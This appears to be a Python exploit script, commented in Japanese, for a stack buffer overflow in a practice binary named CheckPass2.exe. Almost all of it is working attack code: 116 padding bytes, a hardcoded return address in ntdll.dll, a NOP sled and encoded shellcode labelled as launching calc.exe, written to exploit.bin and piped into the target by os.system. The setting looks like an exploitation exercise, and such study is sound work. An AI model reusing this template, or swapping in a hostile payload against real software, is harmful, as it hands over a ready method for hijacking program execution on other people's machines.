#!/usr/bin/python3 -V
# coding: Shift_JIS
import sys
import struct
import os

#calc.exe
#このシェルコードは、espに対してpushやpopの操作が発生するため、
#スタック上にシェルコードがあると、シェルコード自体が破壊される。
#そのため、esp付近にはnopスレッドを埋めておく。
shellcode = "\x90" * 50
shellcode += "\xd9\xc9\xbd\xbc\x9f\xfb\xbb\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x31"
shellcode += "\x31\x68\x18\x83\xc0\x04\x03\x68\xa8\x7d\x0e\x47\x38\x03\xf1\xb8"
shellcode += "\xb8\x64\x7b\x5d\x89\xa4\x1f\x15\xb9\x14\x6b\x7b\x35\xde\x39\x68"
shellcode += "\xce\x92\x95\x9f\x67\x18\xc0\xae\x78\x31\x30\xb0\xfa\x48\x65\x12"
shellcode += "\xc3\x82\x78\x53\x04\xfe\x71\x01\xdd\x74\x27\xb6\x6a\xc0\xf4\x3d"
shellcode += "\x20\xc4\x7c\xa1\xf0\xe7\xad\x74\x8b\xb1\x6d\x76\x58\xca\x27\x60"
shellcode += "\xbd\xf7\xfe\x1b\x75\x83\x00\xca\x44\x6c\xae\x33\x69\x9f\xae\x74"
shellcode += "\x4d\x40\xc5\x8c\xae\xfd\xde\x4a\xcd\xd9\x6b\x49\x75\xa9\xcc\xb5"
shellcode += "\x84\x7e\x8a\x3e\x8a\xcb\xd8\x19\x8e\xca\x0d\x12\xaa\x47\xb0\xf5"
shellcode += "\x3b\x13\x97\xd1\x60\xc7\xb6\x40\xcc\xa6\xc7\x93\xaf\x17\x62\xdf"
shellcode += "\x5d\x43\x1f\x82\x0b\x92\xad\xb8\x79\x94\xad\xc2\x2d\xfd\x9c\x49"
shellcode += "\xa2\x7a\x21\x98\x87\x75\x6b\x81\xa1\x1d\x32\x53\xf0\x43\xc5\x89"
shellcode += "\x36\x7a\x46\x38\xc6\x79\x56\x49\xc3\xc6\xd0\xa1\xb9\x57\xb5\xc5"
shellcode += "\x6e\x57\x9c\xa5\xf1\xcb\x7c\x04\x94\x6b\xe6\x58"

dummy = "A" * 116

#baseAddr = int("0x77cb0000",16) #C:\Windows\SysWOW64\ntdll.dll
#retAddr =  baseAddr + int("0x00062fbd", 16)
retAddr = int("0x77891efd", 16)

buf = dummy + struct.pack('<I', retAddr) + shellcode 
f = open("exploit.bin","wb")
f.write(buf)
f.close()

os.system("CheckPass2.exe < exploit.bin")	
